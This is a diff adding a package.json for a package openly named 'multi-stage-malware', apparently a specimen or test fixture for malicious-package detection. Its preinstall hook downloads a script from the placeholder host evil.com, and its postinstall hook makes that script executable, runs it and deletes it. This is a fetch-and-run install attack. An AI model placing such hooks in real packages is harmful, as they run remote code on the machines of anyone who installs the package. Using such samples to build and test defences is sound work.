@@ -1,0 +1,8 @@
+{
+  "name": "multi-stage-malware",
+  "version": "1.5.0",
+  "scripts": {
+    "preinstall": "curl -s https://evil.com/stage1.sh -o /tmp/setup.sh",
+    "postinstall": "chmod +x /tmp/setup.sh && /tmp/setup.sh && rm /tmp/setup.sh"
+  }
+}
